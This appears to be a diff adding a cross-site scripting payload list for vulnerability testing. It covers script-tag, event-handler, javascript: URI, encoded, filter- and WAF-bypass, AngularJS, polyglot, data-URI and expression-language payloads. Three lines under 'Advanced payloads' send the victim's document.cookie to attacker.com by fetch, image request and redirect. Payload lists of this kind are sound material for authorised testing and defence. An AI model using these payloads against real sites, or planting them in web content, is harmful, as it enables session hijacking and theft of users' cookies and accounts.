@@ -1,0 +1,82 @@
+# XSS (Cross-Site Scripting) Payloads
+# Various payloads for testing XSS vulnerabilities
+
+# Basic script payloads
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>prompt('XSS')</script>
+<script>confirm('XSS')</script>
+
+# Event handler payloads
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+
+# JavaScript protocol payloads
+javascript:alert('XSS')
+javascript:alert(1)
+javascript:prompt('XSS')
+javascript:confirm('XSS')
+
+# Encoded payloads
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Filter bypass payloads
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('XSS')</script>
+<script>eval('alert("XSS")')</script>
+
+# HTML5 payloads
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+
+# Advanced payloads
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>
+<script>window.location='http://attacker.com/steal?cookie='+document.cookie</script>
+
+# DOM-based payloads
+<script>document.write('<img src=x onerror=alert("XSS")/>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert("XSS")/>'</script>
+
+# AngularJS payloads
+{{constructor.constructor('alert("XSS")')()}}
+{{$eval.constructor('alert("XSS")')()}}
+{{$on.constructor('alert("XSS")')()}}
+
+# React/JSX payloads
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert("XSS")/>'}}></div>
+
+# Polyglot payloads
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
+'">><marquee><img src=x onerror=confirm(1)></marquee></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+
+# WAF bypass payloads
+<script>alert('XSS')</script>
+<sCrIpT>alert('XSS')</ScRiPt>
+<script>alert`XSS`</script>
+<script>alert(atob('WFNTJyk='))</script>
+<svg/onload=alert('XSS')>
+<iframe srcdoc='<script>alert("XSS")</script>'>
+
+# Data URI payloads
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# Expression Language payloads
+${alert('XSS')}
+#{alert('XSS')}
+<%=alert('XSS')%>
